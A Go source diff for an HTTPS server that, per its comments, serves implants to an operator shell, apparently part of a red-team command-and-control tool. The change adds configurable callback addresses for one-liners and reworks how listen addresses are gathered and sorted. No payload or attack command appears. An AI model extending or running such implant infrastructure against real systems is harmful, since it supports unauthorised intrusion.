@@ -53,13 +53,14 @@ var (
 
 // Server serves implants over HTTPS.
 type Server struct {
-	fdir  string /* Static files directory. */
-	ich   <-chan string
-	och   chan<- opshell.CLine
-	l     sstls.Listener
-	ps    pinkSender
-	tmpl  *template.Template
-	curID atomic.Pointer[string] /* Current implant ID. */
+	fdir    string /* Static files directory. */
+	ich     <-chan string
+	och     chan<- opshell.CLine
+	l       sstls.Listener
+	ps      pinkSender
+	tmpl    *template.Template
+	curID   atomic.Pointer[string] /* Current implant ID. */
+	cbAddrs []string
 }
 
 // New returns a new Server, listening on addr.  Call its Do method to start it
@@ -74,6 +75,7 @@ func New(
 	ich <-chan string,
 	och chan<- opshell.CLine,
 	certFile string,
+	cbAddrs []string, /* Callback addresses, for one-liners. */
 ) (*Server, func(), error) {
 	var l sstls.Listener
 
@@ -113,12 +115,13 @@ func New(
 	}
 
 	return &Server{
-		fdir: fdir,
-		ich:  ich,
-		och:  och,
-		l:    l,
-		ps:   pinkSender{och},
-		tmpl: tmpl,
+		fdir:    fdir,
+		ich:     ich,
+		och:     och,
+		l:       l,
+		ps:      pinkSender{och},
+		tmpl:    tmpl,
+		cbAddrs: cbAddrs,
 	}, cleanup, nil
 }
 
@@ -187,16 +190,34 @@ func (s *Server) Do(ctx context.Context) error {
 
 // listenAddresseses gets all of the addresses we have for the box.
 func (s *Server) listenAddresses(l net.Listener) ([]string, error) {
-	/* If it's not an ip:port pair, it's probably a domain name. */
+	var addrs []string
+
+	/* Parse the listen address and port, which we'll need for
+	manually-added callback addresses. */
 	ls := l.Addr().String()
 	ap, err := netip.ParseAddrPort(ls)
 	if nil != err {
-		return []string{ls}, nil
+		return nil, fmt.Errorf(
+			"parsing listen address %s: %w",
+			ls,
+			err,
+		)
+	}
+	port := strconv.Itoa(int(ap.Port()))
+
+	/* Add extra addresses, for just in case. */
+	for _, a := range s.cbAddrs {
+		/* Make sure we have a port. */
+		if _, p, err := net.SplitHostPort(a); "" == p || nil != err {
+			a = net.JoinHostPort(a, port)
+		}
+		addrs = append(addrs, a)
 	}
 
-	/* If it's not a wildcard address, we're good. */
+	/* If the listen address isn't a wildcard address, we're good with
+	just i. */
 	if !ap.Addr().IsUnspecified() {
-		return []string{ap.String()}, nil
+		return sortAddresses(append(addrs, ap.String())), nil
 	}
 
 	/* Get all the addresses we know about. */
@@ -204,7 +225,6 @@ func (s *Server) listenAddresses(l net.Listener) ([]string, error) {
 	if nil != err {
 		return nil, fmt.Errorf("enumerating interfaces: %w", err)
 	}
-	as := make([]string, 0, len(nifs))
 	for _, nif := range nifs {
 		/* Dont print loopback addresses. */
 		if 0 != net.FlagLoopback&nif.Flags {
@@ -228,37 +248,42 @@ func (s *Server) listenAddresses(l net.Listener) ([]string, error) {
 				s = a.Addr().String()
 			}
 			/* Save the address with the listen port. */
-			as = append(as, net.JoinHostPort(
-				s,
-				strconv.Itoa(int(ap.Port())),
-			))
+			addrs = append(addrs, net.JoinHostPort(s, port))
 		}
 	}
+	addrs = sortAddresses(addrs)
+
+	/* If we haven't any addresses by this point, something's wrong. */
+	if 0 == len(addrs) {
+		return nil, fmt.Errorf("no interfaces have addresses")
+	}
+
+	return addrs, nil
+}
+
+// sortAddresses sorts a slice of addresses as string.  Non-IP:Port pairs come
+// first, sorted lexicographically, then come IP addresses, sorted as per
+// netip.AddrPort.Compare.  The returned slice is deduped via slices.Compact..
+func sortAddresses(as []string) []string {
 	slices.SortFunc(as, func(a, b string) int {
 		/* If either both address are addresses or both aren't sort
 		as normal. */
-		aa, ea := netip.ParseAddr(a)
-		ab, eb := netip.ParseAddr(b)
+		aa, ea := netip.ParseAddrPort(a)
+		ab, eb := netip.ParseAddrPort(b)
 		if ea == nil && eb == nil {
 			return aa.Compare(ab)
 		} else if ea != nil && eb != nil {
 			return strings.Compare(a, b)
 		}
-		/* Failing that, real addresses sort before weird addreses. */
+		/* Failing that, non-IP addresses sort before normal addreses,
+		as they're likely what we were asked to print. */
 		if ea == nil && eb != nil {
-			return -1
-		} else if ea != nil && eb == nil {
 			return 1
+		} else if ea != nil && eb == nil {
+			return -1
 		}
 		/* Unpossible. */
 		return 0
 	})
-	as = slices.Compact(as)
-
-	/* If we haven't any addresses by this point, something's wrong. */
-	if 0 == len(as) {
-		return nil, fmt.Errorf("no interfaces have addresses")
-	}
-
-	return as, nil
+	return slices.Compact(as)
 }
